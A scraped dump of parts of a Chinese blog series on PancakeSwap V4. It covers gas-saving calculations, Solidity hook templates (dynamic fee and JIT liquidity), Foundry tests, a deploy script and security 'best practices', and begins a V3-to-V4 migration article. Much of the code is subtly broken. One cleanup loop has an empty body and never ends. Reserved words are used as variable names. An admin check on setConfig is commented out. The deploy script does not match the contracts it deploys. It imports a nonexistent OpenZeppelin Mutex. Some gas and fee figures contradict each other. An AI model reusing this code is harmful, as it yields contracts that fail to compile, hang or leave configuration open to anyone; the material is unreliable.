使用内联\nfunction swap(...) {\n    uint256 amount = min(amount0, amount1);\n}\n\n3. 综合Gas优化效果\n3.1 操作对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n操作V3 GasV4 Gas节省节省%创建池子2,000,000150,0001,850,00092.5%Swap (WETH)140,800100,00040,80029.0%Swap (ETH)140,800100,00040,80029.0%添加流动性200,000180,00020,00010.0%移除流动性150,000130,00020,00013.3%\n3.2 成本计算\n年度节省计算\n假设每天执行以下操作：\n\n100次swap\n10次添加流动性\n5次移除流动性\n1次创建池子（每周1次）\n\nV3年度成本：\nSwap: 100 × 365 × 140,800 = 5,139,200,000 gas/year\nAdd: 10 × 365 × 200,000 = 730,000,000 gas/year\nRemove: 5 × 365 × 150,000 = 273,750,000 gas/year\nCreate: 52 × 2,000,000 = 104,000,000 gas/year\n\nTotal_V3 = 6,246,950,000 gas/year\n\nV4年度成本：\nSwap: 100 × 365 × 100,000 = 3,650,000,000 gas/year\nAdd: 10 × 365 × 180,000 = 657,000,000 gas/year\nRemove: 5 × 365 × 130,000 = 237,250,000 gas/year\nCreate: 52 × 150,000 = 7,800,000 gas/year\n\nTotal_V4 = 4,552,050,000 gas/year\n\n年度节省：\nSavings = 6,246,950,000 - 4,552,050,000\n        = 1,694,900,000 gas/year\n\n以30 gwei计算：\nETH_Savings = 1,694,900,000 × 30 / 1e9 = 50.847 ETH/year\n\n以ETH价格$2000计算：\nUSD_Savings = 50.847 × 2000 = $101,694/year\n\n3.3 批量操作优化\n批量Swap\nV3：每次swap都需要调用池子合约\nGas_V3_batch = n × (G_swap + G_external_call)\n\n假设 n=10, G_swap=100,000, G_external_call=700:\nGas_V3_batch = 10 × (100,000 + 700) = 1,007,000 gas\n\nV4：在Singleton中批量执行\nGas_V4_batch = G_singleton_call + n × G_swap - G_optimization\n\n假设 G_singleton_call=2,100, G_optimization=10,000:\nGas_V4_batch = 2,100 + 10 × 100,000 - 10,000\n             = 992,100 gas\n\n节省：\nSavings = 1,007,000 - 992,100 = 14,900 gas\n节省率 = 14,900 / 1,007,000 = 1.48%\n\n\n4. Gas优化最佳实践\n4.1 存储访问模式\n优化前后对比\n优化前：\nfunction badPattern() public {\n    uint256 a = storage.a;\n    uint256 b = storage.b;\n    uint256 c = storage.c;\n \n    // 使用a, b, c\n \n    storage.a = a + 1;\n    storage.b = b + 1;\n    storage.c = c + 1;\n}\n优化后：\nfunction goodPattern() public {\n    Storage memory cache = storage;\n \n    // 使用cache.a, cache.b, cache.c\n \n    storage = cache;\n}\n节省：\n优化前：3次SLOAD + 3次SSTORE = 3×2,100 + 3×20,000 = 66,300 gas\n优化后：1次SLOAD + 1次SSTORE = 1×2,100 + 1×20,000 = 22,100 gas\n\n节省：44,200 gas (66.7%)\n\n4.2 事件优化\n优化前后对比\n优化前：\nemit Swap(address(this), address(this), -amount0, amount1, sqrtPriceX96, liquidity, tick);\n优化后：\nemit Swap(address(this), address(this), -amount0, amount1);\n节省：\n优化前：每个参数额外~400 gas\n优化后：减少2个参数 = 800 gas节省\n\n4.3 使用Calldata\n优化前后对比\n优化前：\nfunction badFunction(bytes memory data) external {\n    // memory分配和拷贝成本高\n}\n优化后：\nfunction goodFunction(bytes calldata data) external {\n    // calldata直接访问，成本低\n}\n节省：\n对于10KB数据：\nmemory: ~100,000 gas（分配和拷贝）\ncalldata: ~5,000 gas（直接访问）\n\n节省：95,000 gas (95%)\n\n\n5. 本章小结\n5.1 Native ETH要点\nmindmap\n  root((Native ETH))\n    V3问题\n      WETH包装\n      额外gas成本\n      用户体验差\n    V4优势\n      直接支持ETH\n      节省40k gas\n      简化交互\n    数学模型\n      余额追踪\n      Flash Accounting\n      净变化计算\n\n5.2 Gas优化要点\nmindmap\n  root((Gas优化))\n    存储优化\n      槽位打包\n      内存缓存\n      减少访问\n    循环优化\n      循环展开\n      提前退出\n      减少迭代\n    函数优化\n      内联小函数\n      减少调用\n      复用代码\n    批量操作\n      Singleton优势\n      减少外部调用\n      统一结算\n\n5.3 关键公式速查\nNative ETH节省：\nSavings = G_wrap + G_unwrap ≈ 40,800 gas\n\n存储优化：\nSavings = (N-1) × (G_sload - G_mload)\n\n循环展开：\nSavings = n × G_loop\n\n函数内联：\nSavings = n × G_call\n\n\n下一篇预告\n在下一篇文章中，我们将深入探讨Hooks实战与最佳实践，包括：\n\nHooks开发流程\n安全性最佳实践\n常见Hooks模式\n案例分析\n\n\n参考资料\n\nPancakeSwap V4 Gas优化文档\nSolidity Gas优化指南\nNative ETH最佳实践\n"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/07-Hooks实战与最佳实践":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/07-Hooks实战与最佳实践","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/07-Hooks实战与最佳实践.md","title":"07-Hooks实战与最佳实践","links":[],"tags":[],"content":"死磕PancakeSwap V4（七）：Hooks实战与最佳实践\n\n本文是「死磕PancakeSwap V4」系列的第七篇，提供Hooks开发的实战指南和最佳实践。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V4架构与核心创新Singleton、Hooks、Native ETH02Hooks机制详解Hooks类型、数学模型、实现原理03Singleton架构与Flash Accounting存储优化、闪电记账、数学推导04费用系统的数学推导动态费用、数学证明、计算实例05动态流动性机制JIT流动性、数学建模、优化策略06Native ETH与Gas优化ETH直接支持、Gas优化数学07Hooks实战与最佳实践Hooks开发、安全实践、案例分析08V3到V4的迁移与升级迁移策略、兼容性、最佳实践\n\n1. Hooks开发流程\n1.1 开发步骤\nflowchart TB\n    A[需求分析] --&gt; B[Hook类型选择]\n    B --&gt; C[数学建模]\n    C --&gt; D[智能合约开发]\n    D --&gt; E[单元测试]\n    E --&gt; F[集成测试]\n    F --&gt; G[部署测试网]\n    G --&gt; H[审计]\n    H --&gt; I[部署主网]\n    I --&gt; J[监控优化]\n\n    style A fill:#ffeb3b\n    style J fill:#c8e6c9\n\n1.2 需求分析清单\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n问题说明示例业务目标Hook要解决什么问题？动态费用、JIT流动性触发时机在哪个Hook点触发？beforeSwap, afterSwap状态需求需要维护哪些状态？价格历史、流动性数据性能要求Gas预算是多少？&lt;10,000 gas额外成本安全等级需要什么级别的安全？简单/复杂/高级\n\n2. 常见Hooks模式\n2.1 动态费用Hook\n实现模板\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n \nimport &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;\nimport {IPancakeV4Hooks} from &quot;./interfaces/IPancakeV4Hooks.sol&quot;;\n \n/**\n * @title DynamicFeeHook\n * @notice 基于波动率的动态费用Hook\n * @dev 实现beforeSwap和afterSwap Hooks\n */\ncontract DynamicFeeHook is ReentrancyGuard, IPancakeV4Hooks {\n    // ============ 状态变量 ============\n \n    // 费用参数\n    uint256 public constant BASE_FEE = 300;  // 0.03%\n    uint256 public constant ALPHA = 393;   // 0.0393% per 1% volatility\n    uint256 public FEE_BASE = 221;       // 0.221%\n    uint256 public BETA = 1;              // 线性模型\n \n    // 价格历史\n    struct PricePoint {\n        uint256 price;\n        uint256 timestamp;\n    }\n \n    PricePoint[] public priceHistory;\n    uint256 public constant WINDOW_SIZE = 3600;  // 1小时窗口\n \n    // 池子地址\n    address public pool;\n \n    // ============ 修饰符 ============\n \n    modifier onlyPool() {\n        require(msg.sender == pool, &quot;Not pool&quot;);\n        _;\n    }\n \n    // ============ Hook函数 ============\n \n    /**\n     * @notice beforeSwap Hook\n     * @dev 计算并返回动态费用率\n     */\n    function beforeSwap(\n        address sender,\n        address recipient,\n        int256 amount0,\n        int256 amount1,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external onlyPool nonReentrant returns (bytes memory) {\n        // 计算当前价格\n        uint256 currentPrice = calculatePrice(sqrtPriceLimitX96);\n \n        // 更新价格历史\n        _updatePriceHistory(currentPrice);\n \n        // 计算波动率\n        uint256 volatility = _calculateVolatility();\n \n        // 计算动态费用\n        uint256 dynamicFee = _calculateDynamicFee(volatility);\n \n        return abi.encode(dynamicFee);\n    }\n \n    /**\n     * @notice afterSwap Hook\n     * @dev 可选：用于记录交易统计\n     */\n    function afterSwap(\n        address sender,\n        address recipient,\n        int256 amount0,\n        int256 amount1,\n        uint160 sqrtPriceX96,\n        int24 tick,\n        bytes calldata data\n    ) external onlyPool returns (bytes memory) {\n        // 可以在此添加统计逻辑\n        return bytes(&quot;&quot;);\n    }\n \n    // ============ 核心计算函数 ============\n \n    /**\n     * @notice 计算价格\n     */\n    function calculatePrice(uint160 sqrtPriceX96) public pure returns (uint256) {\n        return (uint256(sqrtPriceX96) ** 2) &gt;&gt; 192;\n    }\n \n    /**\n     * @notice 更新价格历史\n     */\n    function _updatePriceHistory(uint256 price) internal {\n        priceHistory.push(PricePoint({\n            price: price,\n            timestamp: block.timestamp\n        }));\n \n        // 清理过期数据\n        while (\n            priceHistory.length &gt; 0 &amp;&amp;\n            block.timestamp - priceHistory[0].timestamp &gt; WINDOW_SIZE\n        ) {\n            // 使用更高效的方法移除过期数据\n            // （实际实现应该使用循环队列）\n        }\n    }\n \n    /**\n     * @notice 计算波动率\n     */\n    function _calculateVolatility() internal view returns (uint256) {\n        if (priceHistory.length &lt; 2) {\n            return 0;  // 数据不足\n        }\n \n        // 计算收益率\n        uint256[] memory returns = new uint256[](priceHistory.length - 1);\n        uint256 sumReturns = 0;\n \n        for (uint256 i = 1; i &lt; priceHistory.length; i++) {\n            uint256 r = (priceHistory[i].price * 1e18) / priceHistory[i-1].price;\n            returns[i-1] = r;\n            sumReturns += r;\n        }\n \n        // 平均收益率\n        uint256 mean = sumReturns / (priceHistory.length - 1);\n \n        // 计算方差\n        uint256 variance = 0;\n        for (uint256 i = 0; i &lt; returns.length; i++) {\n            int256 diff = int256(returns[i]) - int256(mean);\n            variance += uint256(diff * diff);\n        }\n \n        variance = variance / returns.length;\n \n        // 波动率（标准差）\n        uint256 volatility = _sqrt(variance);\n \n        // 转换为百分比\n        return volatility / 1e16;  // 转换为%\n    }\n \n    /**\n     * @notice 计算动态费用\n     */\n    function _calculateDynamicFee(uint256 volatility) internal view returns (uint256) {\n        // 线性模型：fee = α × σ + fee_base\n        uint256 fee = (ALPHA * volatility / 100) + FEE_BASE;\n \n        // 限制费用范围\n        fee = _max(fee, 100);     // 最小0.01%\n        fee = _min(fee, 10000);   // 最大1.00%\n \n        return fee;\n    }\n \n    // ============ 工具函数 ============\n \n    function _sqrt(uint256 x) internal pure returns (uint256) {\n        if (x == 0) return 0;\n        uint256 z = (x + 1) / 2;\n        uint256 y = x;\n        while (z &lt; y) {\n            y = z;\n            z = (x / z + 1) / 2;\n        }\n        return y;\n    }\n \n    function _max(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a &gt;= b ? a : b;\n    }\n \n    function _min(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a &lt;= b ? a : b;\n    }\n \n    // ============ 初始化 ============\n \n    constructor(address _pool) {\n        pool = _pool;\n    }\n}\n2.2 JIT流动性Hook\n实现模板\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n \nimport &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;\nimport {IPancakeV4Hooks} from &quot;./interfaces/IPancakeV4Hooks.sol&quot;;\n \n/**\n * @title JITLiquidityHook\n * @notice JIT流动性提供Hook\n * @dev 在swap前临时添加流动性，swap后立即移除\n */\ncontract JITLiquidityHook is ReentrancyGuard, IPancakeV4Hooks {\n    // ============ 状态变量 ============\n \n    address public pool;\n    address public liquidityToken;\n    uint256 public liquidityAmount;\n \n    // JIT配置\n    struct JITConfig {\n        uint256 minTradeSize;      // 最小交易量\n        uint256 minSlippage;        // 最小滑点 (1e18 = 100%)\n        uint256 maxAddTime;         // 最大添加时间（秒）\n        uint256 maxRemoveTime;     // 最大移除时间（秒）\n    }\n \n    JITConfig public config;\n \n    // JIT状态\n    struct JITState {\n        bool liquidityAdded;\n        uint256 addedTimestamp;\n        int24 tickLower;\n        int24 tickUpper;\n        uint128 liquidity;\n    }\n \n    JITState public jitState;\n \n    // ============ 修饰符 ============\n \n    modifier onlyPool() {\n        require(msg.sender == pool, &quot;Not pool&quot;);\n        _;\n    }\n \n    // ============ Hook函数 ============\n \n    /**\n     * @notice beforeSwap Hook\n     * @dev 检查是否需要添加JIT流动性\n     */\n    function beforeSwap(\n        address sender,\n        address recipient,\n        int256 amount0,\n        int256 amount1,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external onlyPool nonReentrant returns (bytes memory) {\n        // 检查是否需要添加JIT流动性\n        bool shouldAdd = _shouldAddJIT(amount0, amount1, sqrtPriceLimitX96);\n \n        if (shouldAdd) {\n            _addJITLiquidity();\n        }\n \n        return bytes(&quot;&quot;);\n    }\n \n    /**\n     * @notice afterSwap Hook\n     * @dev 检查是否需要移除JIT流动性\n     */\n    function afterSwap(\n        address sender,\n        address recipient,\n        int256 amount0,\n        int256 amount1,\n        uint160 sqrtPriceX96,\n        int24 tick,\n        bytes calldata data\n    ) external onlyPool nonReentrant returns (bytes memory) {\n        // 检查是否需要移除流动性\n        if (jitState.liquidityAdded) {\n            _removeJITLiquidity();\n        }\n \n        return bytes(&quot;&quot;);\n    }\n \n    // ============ JIT逻辑 ============\n \n    function _shouldAddJIT(\n        int256 amount0,\n        int256 amount1,\n        uint160 sqrtPriceLimitX96\n    ) internal view returns (bool) {\n        // 检查是否已经添加\n        if (jitState.liquidityAdded) {\n            return false;\n        }\n \n        // 计算交易量\n        uint256 tradeSize = _max(_abs(amount0), _abs(amount1));\n \n        // 检查最小交易量\n        if (tradeSize &lt; config.minTradeSize) {\n            return false;\n        }\n \n        // 获取当前价格\n        uint160 currentSqrtPrice = _getCurrentSqrtPrice();\n \n        // 计算滑点\n        uint256 slippage = _calculateSlippage(\n            currentSqrtPrice,\n            sqrtPriceLimitX96\n        );\n \n        // 检查最小滑点\n        if (slippage &lt; config.minSlippage) {\n            return false;\n        }\n \n        return true;\n    }\n \n    function _addJITLiquidity() internal {\n        // 计算价格区间\n        (int24 tickLower, int24 tickUpper) = _calculateTickRange();\n \n        // 添加流动性\n        // （实际实现需要调用池子的mint函数）\n        // 这里只是记录状态\n \n        jitState.liquidityAdded = true;\n        jitState.addedTimestamp = block.timestamp;\n        jitState.tickLower = tickLower;\n        jitState.tickUpper = tickUpper;\n        jitState.liquidity = uint128(liquidityAmount);\n    }\n \n    function _removeJITLiquidity() internal {\n        // 检查时间约束\n        require(\n            block.timestamp - jitState.addedTimestamp &lt;= config.maxRemoveTime,\n            &quot;Too late to remove&quot;\n        );\n \n        // 移除流动性\n        // （实际实现需要调用池子的burn函数）\n        // 这里只是重置状态\n \n        jitState.liquidityAdded = false;\n        jitState.addedTimestamp = 0;\n    }\n \n    // ============ 计算函数 ============\n \n    function _calculateTickRange() internal view returns (int24, int24) {\n        // 获取当前tick\n        int24 currentTick = _getCurrentTick();\n \n        // 计算区间宽度\n        int24 tickWidth = 100;  // 固定宽度\n \n        return (currentTick - tickWidth, currentTick + tickWidth);\n    }\n \n    function _calculateSlippage(\n        uint160 sqrtPriceStart,\n        uint160 sqrtPriceEnd\n    ) internal pure returns (uint256) {\n        uint256 priceStart = (uint256(sqrtPriceStart) ** 2) &gt;&gt; 192;\n        uint256 priceEnd = (uint256(sqrtPriceEnd) ** 2) &gt;&gt; 192;\n \n        if (priceEnd &gt;= priceStart) {\n            return ((priceEnd - priceStart) * 1e18) / priceStart;\n        } else {\n            return ((priceStart - priceEnd) * 1e18) / priceStart;\n        }\n    }\n \n    function _getCurrentSqrtPrice() internal view returns (uint160) {\n        // 从池子获取当前价格\n        // 实现略\n        return 0;\n    }\n \n    function _getCurrentTick() internal view returns (int24) {\n        // 从池子获取当前tick\n        // 实现略\n        return 0;\n    }\n \n    // ============ 工具函数 ============\n \n    function _abs(int256 x) internal pure returns (uint256) {\n        return x &gt;= 0 ? uint256(x) : uint256(-x);\n    }\n \n    function _max(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a &gt;= b ? a : b;\n    }\n \n    // ============ 配置管理 ============\n \n    function setConfig(JITConfig calldata _config) external {\n        // 只有管理员可以配置\n        // require(msg.sender == admin, &quot;Not admin&quot;);\n        config = _config;\n    }\n \n    // ============ 初始化 ============\n \n    constructor(\n        address _pool,\n        address _liquidityToken,\n        uint256 _liquidityAmount,\n        JITConfig memory _config\n    ) {\n        pool = _pool;\n        liquidityToken = _liquidityToken;\n        liquidityAmount = _liquidityAmount;\n        config = _config;\n    }\n}\n\n3. 安全最佳实践\n3.1 重入攻击防护\n问题场景\nsequenceDiagram\n    participant Pool as Pool\n    participant Hook as 恶意Hook\n    participant User as 用户\n\n    User-&gt;&gt;Pool: swap()\n    Pool-&gt;&gt;Hook: beforeSwap()\n    Hook-&gt;&gt;Hook: 恶意逻辑\n    Hook-&gt;&gt;Pool: 再次调用swap()\n    Pool-&gt;&gt;Pool: 状态未恢复\n\n解决方案\n使用ReentrancyGuard：\nimport &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;\n \ncontract SecureHook is ReentrancyGuard {\n    function beforeSwap(\n        address sender,\n        address recipient,\n        int256 amount0,\n        int256 amount1,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external nonReentrant returns (bytes memory) {\n        // Hook逻辑\n        return bytes(&quot;&quot;);\n    }\n}\n3.2 权限控制\n问题：任何人都可以调用Hook\n// 不安全\nfunction beforeSwap(...) external {\n    // 没有权限检查\n}\n解决方案\n// 安全\ncontract SecureHook {\n    address public immutable pool;\n \n    modifier onlyPool() {\n        require(msg.sender == pool, &quot;Not pool&quot;);\n        _;\n    }\n \n    function beforeSwap(...) external onlyPool {\n        // 只有池子可以调用\n    }\n \n    constructor(address _pool) {\n        pool = _pool;\n    }\n}\n3.3 状态一致性\n问题：Hook修改状态，但Pool未感知\n// 不安全\ncontract UnsafeHook {\n    uint256 public counter;\n \n    function beforeSwap(...) external {\n        counter++;  // 状态改变\n        // Pool不知道\n    }\n}\n解决方案\n// 安全\ncontract SafeHook {\n    uint256 public version;\n    mapping(uint256 =&gt; uint256) public snapshots;\n \n    modifier checkpoint() {\n        uint256 currentVersion = version;\n        snapshots[currentVersion] = counter;\n \n        _;  // 执行操作\n \n        // 检查状态一致性\n        require(\n            counter == snapshots[currentVersion],\n            &quot;State inconsistent&quot;\n        );\n    }\n \n    function beforeSwap(...) external checkpoint {\n        counter++;  // 状态改变\n    }\n}\n3.4 Gas限制\n问题：Hook消耗过多gas\n// 不安全\ncontract ExpensiveHook {\n    function beforeSwap(...) external {\n        // 循环1000次\n        for (uint256 i = 0; i &lt; 1000; i++) {\n            // 昂贵操作\n        }\n    }\n}\n解决方案\n// 安全\ncontract GasLimitedHook {\n    uint256 public constant MAX_GAS = 50000;\n \n    function beforeSwap(...) external {\n        uint256 gasBefore = gasleft();\n \n        // Hook逻辑\n \n        require(\n            gasBefore - gasleft() &lt;= MAX_GAS,\n            &quot;Gas limit exceeded&quot;\n        );\n    }\n}\n\n4. 测试策略\n4.1 单元测试\nFoundry测试示例\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n \nimport &quot;forge-std/Test.sol&quot;;\nimport &quot;../src/DynamicFeeHook.sol&quot;;\n \ncontract DynamicFeeHookTest is Test {\n    DynamicFeeHook hook;\n    address pool;\n \n    function setUp() public {\n        pool = address(0x1);\n        hook = new DynamicFeeHook(pool);\n    }\n \n    function testCalculatePrice() public {\n        uint160 sqrtPriceX96 = 5602277097478613991873193812722;  // price = 1\n        uint256 price = hook.calculatePrice(sqrtPriceX96);\n        assertEq(price, 1e18);\n    }\n \n    function testDynamicFee() public {\n        // 测试波动率为1%时的费用\n        uint256 volatility = 100;  // 1%\n        uint256 fee = hook.calculateDynamicFee(volatility);\n \n        // 预期：fee = 0.0393 × 1 + 0.221 = 0.2603%\n        assertEq(fee, 260);  // 0.02603%\n    }\n \n    function testDynamicFeeMax() public {\n        // 测试最大费用\n        uint256 volatility = 5000;  // 50%\n        uint256 fee = hook.calculateDynamicFee(volatility);\n \n        // 应该限制在1.00%\n        assertLe(fee, 10000);\n    }\n \n    function testDynamicFeeMin() public {\n        // 测试最小费用\n        uint256 volatility = 0;  // 0%\n        uint256 fee = hook.calculateDynamicFee(volatility);\n \n        // 应该至少0.01%\n        assertGe(fee, 100);\n    }\n}\n4.2 集成测试\ncontract IntegrationTest is Test {\n    PancakeV4PoolManager poolManager;\n    DynamicFeeHook hook;\n    MockERC20 token0;\n    MockERC20 token1;\n \n    function setUp() public {\n        // 部署合约\n        token0 = new MockERC20(&quot;Token0&quot;, &quot;T0&quot;);\n        token1 = new MockERC20(&quot;Token1&quot;, &quot;T1&quot;);\n        hook = new DynamicFeeHook(address(poolManager));\n        poolManager = new PancakeV4PoolManager();\n \n        // 创建池子\n        poolManager.createPool(address(token0), address(token1), 300, address(hook));\n    }\n \n    function testSwapWithDynamicFee() public {\n        // 准备代币\n        token0.mint(address(this), 1000 * 1e18);\n        token0.approve(address(poolManager), 1000 * 1e18);\n \n        // 执行swap\n        (int256 amount0, int256 amount1) = poolManager.swap(\n            address(token0),\n            address(token1),\n            300,  // fee\n            int256(100 * 1e18),  // amountIn\n            address(this),\n            0,  // sqrtPriceLimit\n            bytes(&quot;&quot;)\n        );\n \n        // 验证结果\n        assertEq(amount0, -100 * 1e18);\n        assertTrue(amount1 &gt; 0);\n    }\n}\n\n5. 部署指南\n5.1 部署流程\nflowchart TB\n    A[准备部署脚本] --&gt; B[配置参数]\n    B --&gt; C[部署到测试网]\n    C --&gt; D[验证功能]\n    D --&gt; E[安全审计]\n    E --&gt; F[部署到主网]\n    F --&gt; G[监控性能]\n\n    style A fill:#ffeb3b\n    style G fill:#c8e6c9\n\n5.2 Foundry部署脚本\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n \nimport &quot;forge-std/Script.sol&quot;;\nimport &quot;../src/DynamicFeeHook.sol&quot;;\nimport {PancakeV4PoolManager} from &quot;../src/PancakeV4PoolManager.sol&quot;;\n \ncontract DeployHook is Script {\n    function run() external {\n        uint256 deployerPrivateKey = vm.envUint(&quot;PRIVATE_KEY&quot;);\n        address deployer = vm.addr(deployerPrivateKey);\n \n        vm.startBroadcast(deployerPrivateKey);\n \n        // 部署Hook\n        DynamicFeeHook hook = new DynamicFeeHook(\n            address(0x1),  // pool address\n            300,          // base fee\n            393,          // alpha\n            221,          // fee base\n            1             // beta\n        );\n \n        // 配置Hook\n        hook.setConfig(DynamicFeeHook.JITConfig({\n            minTradeSize: 100000 * 1e18,\n            minSlippage: 1e16,  // 1%\n            maxAddTime: 60,     // 60 seconds\n            maxRemoveTime: 120  // 120 seconds\n        }));\n \n        // 验证部署\n        console.log(&quot;Hook deployed to:&quot;, address(hook));\n        console.log(&quot;Pool:&quot;, hook.pool());\n        console.log(&quot;Base Fee:&quot;, hook.BASE_FEE());\n \n        vm.stopBroadcast();\n    }\n}\n5.3 部署验证\n# 1. 编译合约\nforge build\n \n# 2. 部署到测试网\nforge script script/DeployHook.s.sol \\\n    --rpc-url $GOERLI_RPC_URL \\\n    --broadcast \\\n    --verify\n \n# 3. 验证部署\ncast call $HOOK_ADDRESS &quot;pool()&quot;\n \n# 4. 测试Hook功能\ncast send $HOOK_ADDRESS &quot;setConfig((uint256,uint256,uint256,uint256))&quot; \\\n    $MIN_TRADE_SIZE $MIN_SLIPPAGE $MAX_ADD_TIME $MAX_REMOVE_TIME \\\n    --private-key $PRIVATE_KEY\n\n6. 监控与优化\n6.1 性能监控\nGas消耗监控\ncontract GasMonitor {\n    uint256 public lastGasUsed;\n    uint256 public avgGasUsed;\n    uint256 public maxGasUsed;\n    uint256 public callCount;\n \n    function recordGas(uint256 gasUsed) internal {\n        lastGasUsed = gasUsed;\n        maxGasUsed = gasUsed &gt; maxGasUsed ? gasUsed : maxGasUsed;\n        avgGasUsed = (avgGasUsed * callCount + gasUsed) / (callCount + 1);\n        callCount++;\n    }\n \n    function getStats() external view returns (\n        uint256 last,\n        uint256 avg,\n        uint256 max,\n        uint256 count\n    ) {\n        return (lastGasUsed, avgGasUsed, maxGasUsed, callCount);\n    }\n}\n6.2 性能优化建议\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n优化项预期节省实施难度减少存储访问10-20%低内存缓存5-10%低循环展开2-5%中函数内联1-3%低事件精简5-15%低\n\n7. 常见问题\n7.1 Hook不被调用\n原因：\n\nHook地址未正确设置\nHook未实现必需的接口\nHook已禁用\n\n解决方案：\n// 检查Hook是否正确配置\nfunction checkHook() external view returns (bool) {\n    address poolAddress = poolManager.getPool(\n        token0,\n        token1,\n        fee\n    );\n \n    address hookAddress = PancakeV4Pool(poolAddress).hook();\n \n    return hookAddress == address(this);\n}\n7.2 Gas成本过高\n原因：\n\nHook逻辑过于复杂\n存储访问过多\n循环次数过多\n\n解决方案：\n// 1. 添加gas限制\nmodifier gasLimit(uint256 maxGas) {\n    uint256 gasBefore = gasleft();\n    _;\n    require(gasBefore - gasleft() &lt;= maxGas, &quot;Gas limit exceeded&quot;);\n}\n \n// 2. 优化存储访问\nfunction optimized() external {\n    uint256 value1 = storage1;  // 读取一次\n    uint256 value2 = storage2;  // 读取一次\n \n    // 使用缓存的值\n    // ...\n}\n \n// 3. 减少循环\nfor (uint256 i = 0; i &lt; 10; i++) {  // 固定次数\n    // ...\n}\n7.3 状态不一致\n原因：\n\nHook修改状态但未通知池子\n并发调用导致竞态条件\n重入攻击\n\n解决方案：\n// 1. 使用检查点\nmodifier checkpoint() {\n    uint256 snapshot = state;\n    _;\n    require(state == snapshot, &quot;State changed&quot;);\n}\n \n// 2. 使用重入保护\nimport &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;\n \ncontract SafeHook is ReentrancyGuard {\n    function beforeSwap(...) external nonReentrant {\n        // Hook逻辑\n    }\n}\n \n// 3. 使用Mutex\nimport &quot;@openzeppelin/contracts/security/Mutex.sol&quot;;\n \ncontract MutexHook is Mutex {\n    function beforeSwap(...) external mutexLocked {\n        // Hook逻辑\n    }\n}\n\n8. 本章小结\n8.1 Hooks开发要点\nmindmap\n  root((Hooks开发))\n    开发流程\n      需求分析\n      Hook类型选择\n      数学建模\n      智能合约开发\n      测试部署\n    常见模式\n      动态费用\n      JIT流动性\n      费用分配\n      统计分析\n    安全实践\n      重入防护\n      权限控制\n      状态一致性\n      Gas限制\n    测试策略\n      单元测试\n      集成测试\n      Gas测试\n      安全测试\n\n8.2 最佳实践清单\n\n 使用ReentrancyGuard防护重入攻击\n 添加onlyPool修饰符限制调用者\n 实现checkpoint确保状态一致\n 添加gas限制防止DoS攻击\n 编写完整的单元测试\n 进行安全审计\n 部署前在测试网验证\n 部署后持续监控\n\n\n下一篇预告\n在下一篇文章中，我们将深入探讨V3到V4的迁移与升级，包括：\n\n迁移策略设计\n兼容性处理\n数据迁移方案\n最佳实践指南\n\n\n参考资料\n\nPancakeSwap V4 Hooks 开发文档\nFoundry 测试框架\nOpenZeppelin 安全最佳实践\n"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/08-V3到V4的迁移与升级":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/08-V3到V4的迁移与升级","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/08-V3到V4的迁移与升级.md","title":"08-V3到V4的迁移与升级","links":[],"tags":[],"content":"死磕PancakeSwap V4（八）：V3到V4的迁移与升级\n\n本文是「死磕PancakeSwap V4」系列的最后一篇，提供V3到V4的完整迁移策略和最佳实践。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V4架构与核心创新Singleton、Hooks、Native ETH02Hooks机制详解Hooks类型、数学模型、实现原理03Singleton架构与Flash Accounting存储优化、闪电记账、数学推导04费用系统的数学推导动态费用、数学证明、计算实例05动态流动性机制JIT流动性、数学建模、优化策略06Native ETH与Gas优化ETH直接支持、Gas优化数学07Hooks实战与最佳实践Hooks开发、安全实践、案例分析08V3到V4的迁移与升级迁移策略、兼容性、最佳实践\n\n1. 迁移概述\n1.1 迁移必要性\ngraph TB\n    subgraph V3Limitations[&quot;V3局限性&quot;]\n        L1[创建成本高]\n        L2[自定义能力有限]\n        L3[Gas成本高]\n        L4[不支持Native ETH]\n    end\n\n    subgraph V4Advantages[&quot;V4优势&quot;]\n        A1[创建成本低92%]\n        A2[Hooks无限定制]\n        A3[Gas优化]\n        A4[支持Native ETH]\n    end\n\n    subgraph Benefits[&quot;迁移收益&quot;]\n        B1[长期成本节省]\n        B2[新功能支持]\n        B3[竞争力提升]\n        B4[用户体验改善]\n    end\n\n    V3Limitations --&gt; A1\n    V3Limitations --&gt; A2\n    V3Limitations --&gt; A3\n    V3Limitations --&gt; A4\n\n    A1 --&gt; B1\n    A2 --&gt; B2\n    A3 --&gt; B3\n    A4 --&gt; B4\n\n    style Benefits fill:#c8e6c9\n\n1.2 